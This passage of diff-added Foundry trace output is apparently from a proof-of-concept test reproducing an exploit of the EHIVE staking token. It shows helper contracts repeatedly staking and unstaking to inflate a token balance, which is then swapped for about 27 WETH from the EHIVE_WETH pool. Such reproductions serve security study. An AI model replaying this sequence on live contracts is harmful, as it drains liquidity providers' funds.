+    │   │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   │   ├─ [996] EHIVE::balanceOf(UnstakeContract: [0x3D7Ebc40AF7092E3F1C81F2e996cbA5Cae2090d7]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 366220692919015806056825496079 [3.662e29]
+    │   │   │   │   │   ├─ [35377] EHIVE::transfer(UnstakeContract: [0xD16d567549A2a2a2005aEACf7fB193851603dd70], 366220692919015806056825496079 [3.662e29])
+    │   │   │   │   │   │   ├─ emit Transfer(from: UnstakeContract: [0x3D7Ebc40AF7092E3F1C81F2e996cbA5Cae2090d7], to: UnstakeContract: [0xD16d567549A2a2a2005aEACf7fB193851603dd70], value: 366220692919015806056825496079 [3.662e29])
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   ├─ [216761] UnstakeContract::unstake(UnstakeContract: [0x96d3F6c20EEd2697647F543fE6C08bC2Fbf39758])
+    │   │   │   │   │   ├─ [996] EHIVE::balanceOf(UnstakeContract: [0xD16d567549A2a2a2005aEACf7fB193851603dd70]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 366220692919015806056825496079 [3.662e29]
+    │   │   │   │   │   ├─ [56114] EHIVE::stake(366220692919015806056825496079 [3.662e29], 0)
+    │   │   │   │   │   │   ├─ emit Transfer(from: UnstakeContract: [0xD16d567549A2a2a2005aEACf7fB193851603dd70], to: 0x0000000000000000000000000000000000000000, value: 366220692919015806056825496079 [3.662e29])
+    │   │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   │   ├─ [121073] EHIVE::unstake(0)
+    │   │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: UnstakeContract: [0xD16d567549A2a2a2005aEACf7fB193851603dd70], value: 385284235838087861714576625679 [3.852e29])
+    │   │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   │   ├─ [996] EHIVE::balanceOf(UnstakeContract: [0xD16d567549A2a2a2005aEACf7fB193851603dd70]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 385284235838087861714576625679 [3.852e29]
+    │   │   │   │   │   ├─ [35377] EHIVE::transfer(UnstakeContract: [0x96d3F6c20EEd2697647F543fE6C08bC2Fbf39758], 385284235838087861714576625679 [3.852e29])
+    │   │   │   │   │   │   ├─ emit Transfer(from: UnstakeContract: [0xD16d567549A2a2a2005aEACf7fB193851603dd70], to: UnstakeContract: [0x96d3F6c20EEd2697647F543fE6C08bC2Fbf39758], value: 385284235838087861714576625679 [3.852e29])
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   ├─ [216761] UnstakeContract::unstake(UnstakeContract: [0x13aa49bAc059d709dd0a18D6bb63290076a702D7])
+    │   │   │   │   │   ├─ [996] EHIVE::balanceOf(UnstakeContract: [0x96d3F6c20EEd2697647F543fE6C08bC2Fbf39758]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 385284235838087861714576625679 [3.852e29]
+    │   │   │   │   │   ├─ [56114] EHIVE::stake(385284235838087861714576625679 [3.852e29], 0)
+    │   │   │   │   │   │   ├─ emit Transfer(from: UnstakeContract: [0x96d3F6c20EEd2697647F543fE6C08bC2Fbf39758], to: 0x0000000000000000000000000000000000000000, value: 385284235838087861714576625679 [3.852e29])
+    │   │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   │   ├─ [121073] EHIVE::unstake(0)
+    │   │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: UnstakeContract: [0x96d3F6c20EEd2697647F543fE6C08bC2Fbf39758], value: 405340127566645859995608292879 [4.053e29])
+    │   │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   │   ├─ [996] EHIVE::balanceOf(UnstakeContract: [0x96d3F6c20EEd2697647F543fE6C08bC2Fbf39758]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 405340127566645859995608292879 [4.053e29]
+    │   │   │   │   │   ├─ [35377] EHIVE::transfer(UnstakeContract: [0x13aa49bAc059d709dd0a18D6bb63290076a702D7], 405340127566645859995608292879 [4.053e29])
+    │   │   │   │   │   │   ├─ emit Transfer(from: UnstakeContract: [0x96d3F6c20EEd2697647F543fE6C08bC2Fbf39758], to: UnstakeContract: [0x13aa49bAc059d709dd0a18D6bb63290076a702D7], value: 405340127566645859995608292879 [4.053e29])
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   ├─ [216761] UnstakeContract::unstake(UnstakeContract: [0xDB25A7b768311dE128BBDa7B8426c3f9C74f3240])
+    │   │   │   │   │   ├─ [996] EHIVE::balanceOf(UnstakeContract: [0x13aa49bAc059d709dd0a18D6bb63290076a702D7]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 405340127566645859995608292879 [4.053e29]
+    │   │   │   │   │   ├─ [56114] EHIVE::stake(405340127566645859995608292879 [4.053e29], 0)
+    │   │   │   │   │   │   ├─ emit Transfer(from: UnstakeContract: [0x13aa49bAc059d709dd0a18D6bb63290076a702D7], to: 0x0000000000000000000000000000000000000000, value: 405340127566645859995608292879 [4.053e29])
+    │   │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   │   ├─ [121073] EHIVE::unstake(0)
+    │   │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: UnstakeContract: [0x13aa49bAc059d709dd0a18D6bb63290076a702D7], value: 426440024618060302022775864079 [4.264e29])
+    │   │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   │   ├─ [996] EHIVE::balanceOf(UnstakeContract: [0x13aa49bAc059d709dd0a18D6bb63290076a702D7]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 426440024618060302022775864079 [4.264e29]
+    │   │   │   │   │   ├─ [35377] EHIVE::transfer(UnstakeContract: [0xDB25A7b768311dE128BBDa7B8426c3f9C74f3240], 426440024618060302022775864079 [4.264e29])
+    │   │   │   │   │   │   ├─ emit Transfer(from: UnstakeContract: [0x13aa49bAc059d709dd0a18D6bb63290076a702D7], to: UnstakeContract: [0xDB25A7b768311dE128BBDa7B8426c3f9C74f3240], value: 426440024618060302022775864079 [4.264e29])
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   ├─ [216761] UnstakeContract::unstake(UnstakeContract: [0x3381cD18e2Fb4dB236BF0525938AB6E43Db0440f])
+    │   │   │   │   │   ├─ [996] EHIVE::balanceOf(UnstakeContract: [0xDB25A7b768311dE128BBDa7B8426c3f9C74f3240]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 426440024618060302022775864079 [4.264e29]
+    │   │   │   │   │   ├─ [56114] EHIVE::stake(426440024618060302022775864079 [4.264e29], 0)
+    │   │   │   │   │   │   ├─ emit Transfer(from: UnstakeContract: [0xDB25A7b768311dE128BBDa7B8426c3f9C74f3240], to: 0x0000000000000000000000000000000000000000, value: 426440024618060302022775864079 [4.264e29])
+    │   │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   │   ├─ [121073] EHIVE::unstake(0)
+    │   │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: UnstakeContract: [0xDB25A7b768311dE128BBDa7B8426c3f9C74f3240], value: 448638272474890838292454526479 [4.486e29])
+    │   │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   │   ├─ [996] EHIVE::balanceOf(UnstakeContract: [0xDB25A7b768311dE128BBDa7B8426c3f9C74f3240]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 448638272474890838292454526479 [4.486e29]
+    │   │   │   │   │   ├─ [35377] EHIVE::transfer(UnstakeContract: [0x3381cD18e2Fb4dB236BF0525938AB6E43Db0440f], 448638272474890838292454526479 [4.486e29])
+    │   │   │   │   │   │   ├─ emit Transfer(from: UnstakeContract: [0xDB25A7b768311dE128BBDa7B8426c3f9C74f3240], to: UnstakeContract: [0x3381cD18e2Fb4dB236BF0525938AB6E43Db0440f], value: 448638272474890838292454526479 [4.486e29])
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   ├─ [216761] UnstakeContract::unstake(UnstakeContract: [0x756e0562323ADcDA4430d6cb456d9151f605290B])
+    │   │   │   │   │   ├─ [996] EHIVE::balanceOf(UnstakeContract: [0x3381cD18e2Fb4dB236BF0525938AB6E43Db0440f]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 448638272474890838292454526479 [4.486e29]
+    │   │   │   │   │   ├─ [56114] EHIVE::stake(448638272474890838292454526479 [4.486e29], 0)
+    │   │   │   │   │   │   ├─ emit Transfer(from: UnstakeContract: [0x3381cD18e2Fb4dB236BF0525938AB6E43Db0440f], to: 0x0000000000000000000000000000000000000000, value: 448638272474890838292454526479 [4.486e29])
+    │   │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   │   ├─ [121073] EHIVE::unstake(0)
+    │   │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: UnstakeContract: [0x3381cD18e2Fb4dB236BF0525938AB6E43Db0440f], value: 471992045562624881929594987279 [4.719e29])
+    │   │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   │   ├─ [996] EHIVE::balanceOf(UnstakeContract: [0x3381cD18e2Fb4dB236BF0525938AB6E43Db0440f]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 471992045562624881929594987279 [4.719e29]
+    │   │   │   │   │   ├─ [35377] EHIVE::transfer(UnstakeContract: [0x756e0562323ADcDA4430d6cb456d9151f605290B], 471992045562624881929594987279 [4.719e29])
+    │   │   │   │   │   │   ├─ emit Transfer(from: UnstakeContract: [0x3381cD18e2Fb4dB236BF0525938AB6E43Db0440f], to: UnstakeContract: [0x756e0562323ADcDA4430d6cb456d9151f605290B], value: 471992045562624881929594987279 [4.719e29])
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   ├─ [216761] UnstakeContract::unstake(UnstakeContract: [0x1aF7f588A501EA2B5bB3feeFA744892aA2CF00e6])
+    │   │   │   │   │   ├─ [996] EHIVE::balanceOf(UnstakeContract: [0x756e0562323ADcDA4430d6cb456d9151f605290B]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 471992045562624881929594987279 [4.719e29]
+    │   │   │   │   │   ├─ [56114] EHIVE::stake(471992045562624881929594987279 [4.719e29], 0)
+    │   │   │   │   │   │   ├─ emit Transfer(from: UnstakeContract: [0x756e0562323ADcDA4430d6cb456d9151f605290B], to: 0x0000000000000000000000000000000000000000, value: 471992045562624881929594987279 [4.719e29])
+    │   │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   │   ├─ [121073] EHIVE::unstake(0)
+    │   │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: UnstakeContract: [0x756e0562323ADcDA4430d6cb456d9151f605290B], value: 496561494509720423728667428879 [4.965e29])
+    │   │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   │   ├─ [996] EHIVE::balanceOf(UnstakeContract: [0x756e0562323ADcDA4430d6cb456d9151f605290B]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 496561494509720423728667428879 [4.965e29]
+    │   │   │   │   │   ├─ [35377] EHIVE::transfer(UnstakeContract: [0x1aF7f588A501EA2B5bB3feeFA744892aA2CF00e6], 496561494509720423728667428879 [4.965e29])
+    │   │   │   │   │   │   ├─ emit Transfer(from: UnstakeContract: [0x756e0562323ADcDA4430d6cb456d9151f605290B], to: UnstakeContract: [0x1aF7f588A501EA2B5bB3feeFA744892aA2CF00e6], value: 496561494509720423728667428879 [4.965e29])
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   ├─ [216761] UnstakeContract::unstake(UnstakeContract: [0xe8dc788818033232EF9772CB2e6622F1Ec8bc840])
+    │   │   │   │   │   ├─ [996] EHIVE::balanceOf(UnstakeContract: [0x1aF7f588A501EA2B5bB3feeFA744892aA2CF00e6]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 496561494509720423728667428879 [4.965e29]
+    │   │   │   │   │   ├─ [56114] EHIVE::stake(496561494509720423728667428879 [4.965e29], 0)
+    │   │   │   │   │   │   ├─ emit Transfer(from: UnstakeContract: [0x1aF7f588A501EA2B5bB3feeFA744892aA2CF00e6], to: 0x0000000000000000000000000000000000000000, value: 496561494509720423728667428879 [4.965e29])
+    │   │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   │   ├─ [121073] EHIVE::unstake(0)
+    │   │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: UnstakeContract: [0x1aF7f588A501EA2B5bB3feeFA744892aA2CF00e6], value: 522409901073240117018652766479 [5.224e29])
+    │   │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   │   ├─ [996] EHIVE::balanceOf(UnstakeContract: [0x1aF7f588A501EA2B5bB3feeFA744892aA2CF00e6]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 522409901073240117018652766479 [5.224e29]
+    │   │   │   │   │   ├─ [35377] EHIVE::transfer(UnstakeContract: [0xe8dc788818033232EF9772CB2e6622F1Ec8bc840], 522409901073240117018652766479 [5.224e29])
+    │   │   │   │   │   │   ├─ emit Transfer(from: UnstakeContract: [0x1aF7f588A501EA2B5bB3feeFA744892aA2CF00e6], to: UnstakeContract: [0xe8dc788818033232EF9772CB2e6622F1Ec8bc840], value: 522409901073240117018652766479 [5.224e29])
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   ├─ [216761] UnstakeContract::unstake(UnstakeContract: [0x3Cff5E7eBecb676c3Cb602D0ef2d46710b88854E])
+    │   │   │   │   │   ├─ [996] EHIVE::balanceOf(UnstakeContract: [0xe8dc788818033232EF9772CB2e6622F1Ec8bc840]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 522409901073240117018652766479 [5.224e29]
+    │   │   │   │   │   ├─ [56114] EHIVE::stake(522409901073240117018652766479 [5.224e29], 0)
+    │   │   │   │   │   │   ├─ emit Transfer(from: UnstakeContract: [0xe8dc788818033232EF9772CB2e6622F1Ec8bc840], to: 0x0000000000000000000000000000000000000000, value: 522409901073240117018652766479 [5.224e29])
+    │   │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   │   ├─ [121073] EHIVE::unstake(0)
+    │   │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: UnstakeContract: [0xe8dc788818033232EF9772CB2e6622F1Ec8bc840], value: 549603841129107410781264446479 [5.496e29])
+    │   │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   │   ├─ [996] EHIVE::balanceOf(UnstakeContract: [0xe8dc788818033232EF9772CB2e6622F1Ec8bc840]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 549603841129107410781264446479 [5.496e29]
+    │   │   │   │   │   ├─ [35377] EHIVE::transfer(UnstakeContract: [0x3Cff5E7eBecb676c3Cb602D0ef2d46710b88854E], 549603841129107410781264446479 [5.496e29])
+    │   │   │   │   │   │   ├─ emit Transfer(from: UnstakeContract: [0xe8dc788818033232EF9772CB2e6622F1Ec8bc840], to: UnstakeContract: [0x3Cff5E7eBecb676c3Cb602D0ef2d46710b88854E], value: 549603841129107410781264446479 [5.496e29])
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   ├─ [216761] UnstakeContract::unstake(UnstakeContract: [0x27cc01A4676C73fe8b6d0933Ac991BfF1D77C4da])
+    │   │   │   │   │   ├─ [996] EHIVE::balanceOf(UnstakeContract: [0x3Cff5E7eBecb676c3Cb602D0ef2d46710b88854E]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 549603841129107410781264446479 [5.496e29]
+    │   │   │   │   │   ├─ [56114] EHIVE::stake(549603841129107410781264446479 [5.496e29], 0)
+    │   │   │   │   │   │   ├─ emit Transfer(from: UnstakeContract: [0x3Cff5E7eBecb676c3Cb602D0ef2d46710b88854E], to: 0x0000000000000000000000000000000000000000, value: 549603841129107410781264446479 [5.496e29])
+    │   │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   │   ├─ [121073] EHIVE::unstake(0)
+    │   │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: UnstakeContract: [0x3Cff5E7eBecb676c3Cb602D0ef2d46710b88854E], value: 578213356146786974630150097679 [5.782e29])
+    │   │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   │   ├─ [996] EHIVE::balanceOf(UnstakeContract: [0x3Cff5E7eBecb676c3Cb602D0ef2d46710b88854E]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 578213356146786974630150097679 [5.782e29]
+    │   │   │   │   │   ├─ [35377] EHIVE::transfer(UnstakeContract: [0x27cc01A4676C73fe8b6d0933Ac991BfF1D77C4da], 578213356146786974630150097679 [5.782e29])
+    │   │   │   │   │   │   ├─ emit Transfer(from: UnstakeContract: [0x3Cff5E7eBecb676c3Cb602D0ef2d46710b88854E], to: UnstakeContract: [0x27cc01A4676C73fe8b6d0933Ac991BfF1D77C4da], value: 578213356146786974630150097679 [5.782e29])
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   ├─ [216761] UnstakeContract::unstake(UnstakeContract: [0x796f2974e3C1af763252512dd6d521E9E984726C])
+    │   │   │   │   │   ├─ [996] EHIVE::balanceOf(UnstakeContract: [0x27cc01A4676C73fe8b6d0933Ac991BfF1D77C4da]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 578213356146786974630150097679 [5.782e29]
+    │   │   │   │   │   ├─ [56114] EHIVE::stake(578213356146786974630150097679 [5.782e29], 0)
+    │   │   │   │   │   │   ├─ emit Transfer(from: UnstakeContract: [0x27cc01A4676C73fe8b6d0933Ac991BfF1D77C4da], to: 0x0000000000000000000000000000000000000000, value: 578213356146786974630150097679 [5.782e29])
+    │   │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   │   ├─ [121073] EHIVE::unstake(0)
+    │   │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: UnstakeContract: [0x27cc01A4676C73fe8b6d0933Ac991BfF1D77C4da], value: 608312133590044378788978110479 [6.083e29])
+    │   │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   │   ├─ [996] EHIVE::balanceOf(UnstakeContract: [0x27cc01A4676C73fe8b6d0933Ac991BfF1D77C4da]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 608312133590044378788978110479 [6.083e29]
+    │   │   │   │   │   ├─ [35377] EHIVE::transfer(UnstakeContract: [0x796f2974e3C1af763252512dd6d521E9E984726C], 608312133590044378788978110479 [6.083e29])
+    │   │   │   │   │   │   ├─ emit Transfer(from: UnstakeContract: [0x27cc01A4676C73fe8b6d0933Ac991BfF1D77C4da], to: UnstakeContract: [0x796f2974e3C1af763252512dd6d521E9E984726C], value: 608312133590044378788978110479 [6.083e29])
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   ├─ [216761] UnstakeContract::unstake(UnstakeContract: [0x92a6649Fdcc044DA968d94202465578a9371C7b1])
+    │   │   │   │   │   ├─ [996] EHIVE::balanceOf(UnstakeContract: [0x796f2974e3C1af763252512dd6d521E9E984726C]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 608312133590044378788978110479 [6.083e29]
+    │   │   │   │   │   ├─ [56114] EHIVE::stake(608312133590044378788978110479 [6.083e29], 0)
+    │   │   │   │   │   │   ├─ emit Transfer(from: UnstakeContract: [0x796f2974e3C1af763252512dd6d521E9E984726C], to: 0x0000000000000000000000000000000000000000, value: 608312133590044378788978110479 [6.083e29])
+    │   │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   │   ├─ [121073] EHIVE::unstake(0)
+    │   │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: UnstakeContract: [0x796f2974e3C1af763252512dd6d521E9E984726C], value: 639977696708430250561552651279 [6.399e29])
+    │   │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   │   ├─ [996] EHIVE::balanceOf(UnstakeContract: [0x796f2974e3C1af763252512dd6d521E9E984726C]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 639977696708430250561552651279 [6.399e29]
+    │   │   │   │   │   ├─ [35377] EHIVE::transfer(UnstakeContract: [0x92a6649Fdcc044DA968d94202465578a9371C7b1], 639977696708430250561552651279 [6.399e29])
+    │   │   │   │   │   │   ├─ emit Transfer(from: UnstakeContract: [0x796f2974e3C1af763252512dd6d521E9E984726C], to: UnstakeContract: [0x92a6649Fdcc044DA968d94202465578a9371C7b1], value: 639977696708430250561552651279 [6.399e29])
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   ├─ [216761] UnstakeContract::unstake(UnstakeContract: [0xDA5A5ADC64C8013d334A0DA9e711B364Af7A4C2d])
+    │   │   │   │   │   ├─ [996] EHIVE::balanceOf(UnstakeContract: [0x92a6649Fdcc044DA968d94202465578a9371C7b1]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 639977696708430250561552651279 [6.399e29]
+    │   │   │   │   │   ├─ [56114] EHIVE::stake(639977696708430250561552651279 [6.399e29], 0)
+    │   │   │   │   │   │   ├─ emit Transfer(from: UnstakeContract: [0x92a6649Fdcc044DA968d94202465578a9371C7b1], to: 0x0000000000000000000000000000000000000000, value: 639977696708430250561552651279 [6.399e29])
+    │   │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   │   ├─ [121073] EHIVE::unstake(0)
+    │   │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: UnstakeContract: [0x92a6649Fdcc044DA968d94202465578a9371C7b1], value: 673291604208321140316808785679 [6.732e29])
+    │   │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   │   ├─ [996] EHIVE::balanceOf(UnstakeContract: [0x92a6649Fdcc044DA968d94202465578a9371C7b1]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 673291604208321140316808785679 [6.732e29]
+    │   │   │   │   │   ├─ [35377] EHIVE::transfer(UnstakeContract: [0xDA5A5ADC64C8013d334A0DA9e711B364Af7A4C2d], 673291604208321140316808785679 [6.732e29])
+    │   │   │   │   │   │   ├─ emit Transfer(from: UnstakeContract: [0x92a6649Fdcc044DA968d94202465578a9371C7b1], to: UnstakeContract: [0xDA5A5ADC64C8013d334A0DA9e711B364Af7A4C2d], value: 673291604208321140316808785679 [6.732e29])
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   ├─ [216761] UnstakeContract::unstake(UnstakeContract: [0x886D6d1eB8D415b00052828CD6d5B321f072073d])
+    │   │   │   │   │   ├─ [996] EHIVE::balanceOf(UnstakeContract: [0xDA5A5ADC64C8013d334A0DA9e711B364Af7A4C2d]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 673291604208321140316808785679 [6.732e29]
+    │   │   │   │   │   ├─ [56114] EHIVE::stake(673291604208321140316808785679 [6.732e29], 0)
+    │   │   │   │   │   │   ├─ emit Transfer(from: UnstakeContract: [0xDA5A5ADC64C8013d334A0DA9e711B364Af7A4C2d], to: 0x0000000000000000000000000000000000000000, value: 673291604208321140316808785679 [6.732e29])
+    │   │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   │   ├─ [121073] EHIVE::unstake(0)
+    │   │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: UnstakeContract: [0xDA5A5ADC64C8013d334A0DA9e711B364Af7A4C2d], value: 708339660317795391456584625679 [7.083e29])
+    │   │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   │   ├─ [996] EHIVE::balanceOf(UnstakeContract: [0xDA5A5ADC64C8013d334A0DA9e711B364Af7A4C2d]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 708339660317795391456584625679 [7.083e29]
+    │   │   │   │   │   ├─ [35377] EHIVE::transfer(UnstakeContract: [0x886D6d1eB8D415b00052828CD6d5B321f072073d], 708339660317795391456584625679 [7.083e29])
+    │   │   │   │   │   │   ├─ emit Transfer(from: UnstakeContract: [0xDA5A5ADC64C8013d334A0DA9e711B364Af7A4C2d], to: UnstakeContract: [0x886D6d1eB8D415b00052828CD6d5B321f072073d], value: 708339660317795391456584625679 [7.083e29])
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   ├─ [212761] UnstakeContract::unstake(EHIVETest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   │   │   │   │   ├─ [996] EHIVE::balanceOf(UnstakeContract: [0x886D6d1eB8D415b00052828CD6d5B321f072073d]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 708339660317795391456584625679 [7.083e29]
+    │   │   │   │   │   ├─ [56114] EHIVE::stake(708339660317795391456584625679 [7.083e29], 0)
+    │   │   │   │   │   │   ├─ emit Transfer(from: UnstakeContract: [0x886D6d1eB8D415b00052828CD6d5B321f072073d], to: 0x0000000000000000000000000000000000000000, value: 708339660317795391456584625679 [7.083e29])
+    │   │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   │   ├─ [121073] EHIVE::unstake(0)
+    │   │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: UnstakeContract: [0x886D6d1eB8D415b00052828CD6d5B321f072073d], value: 745212135786392959778981092879 [7.452e29])
+    │   │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   │   ├─ [996] EHIVE::balanceOf(UnstakeContract: [0x886D6d1eB8D415b00052828CD6d5B321f072073d]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 745212135786392959778981092879 [7.452e29]
+    │   │   │   │   │   ├─ [31377] EHIVE::transfer(EHIVETest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 745212135786392959778981092879 [7.452e29])
+    │   │   │   │   │   │   ├─ emit Transfer(from: UnstakeContract: [0x886D6d1eB8D415b00052828CD6d5B321f072073d], to: EHIVETest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 745212135786392959778981092879 [7.452e29])
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   ├─ [504] EHIVE_WETH::getReserves() [staticcall]
+    │   │   │   │   │   └─ ← [Return] 171284278568304638009613371775 [1.712e29], 34038705992149191489 [3.403e19], 1692606287 [1.692e9]
+    │   │   │   │   ├─ [996] EHIVE::balanceOf(EHIVETest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 745212135786392959778981092879 [7.452e29]
+    │   │   │   │   ├─ [78141] EHIVE::transfer(EHIVE_WETH: [0xAE851769593AC6048D36BC123700649827659A82], 745212135786392959778981092879 [7.452e29])
+    │   │   │   │   │   ├─ emit Transfer(from: EHIVETest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: EHIVE: [0x4Ae2Cd1F5B8806a973953B76f9Ce6d5FAB9cdcfd], value: 44712728147183577586738865572 [4.471e28])
+    │   │   │   │   │   ├─ emit Transfer(from: EHIVETest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: EHIVE_WETH: [0xAE851769593AC6048D36BC123700649827659A82], value: 700499407639209382192242227307 [7.004e29])
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ [996] EHIVE::balanceOf(EHIVE_WETH: [0xAE851769593AC6048D36BC123700649827659A82]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 871783686207514020201855599082 [8.717e29]
+    │   │   │   │   ├─ [36799] EHIVE_WETH::swap(0, 27334768301100185740 [2.733e19], EHIVETest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x)
+    │   │   │   │   │   ├─ [23162] WETH::transfer(EHIVETest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 27334768301100185740 [2.733e19])
+    │   │   │   │   │   │   ├─ emit Transfer(from: EHIVE_WETH: [0xAE851769593AC6048D36BC123700649827659A82], to: EHIVETest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 27334768301100185740 [2.733e19])
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   ├─ [996] EHIVE::balanceOf(EHIVE_WETH: [0xAE851769593AC6048D36BC123700649827659A82]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 871783686207514020201855599082 [8.717e29]
+    │   │   │   │   │   ├─ [534] WETH::balanceOf(EHIVE_WETH: [0xAE851769593AC6048D36BC123700649827659A82]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 6703937691049005749 [6.703e18]
+    │   │   │   │   │   ├─ emit Sync(reserve0: 871783686207514020201855599082 [8.717e29], reserve1: 6703937691049005749 [6.703e18])
+    │   │   │   │   │   ├─ emit Swap(sender: EHIVETest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], amount0In: 700499407639209382192242227307 [7.004e29], amount1In: 0, amount0Out: 0, amount1Out: 27334768301100185740 [2.733e19], to: EHIVETest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
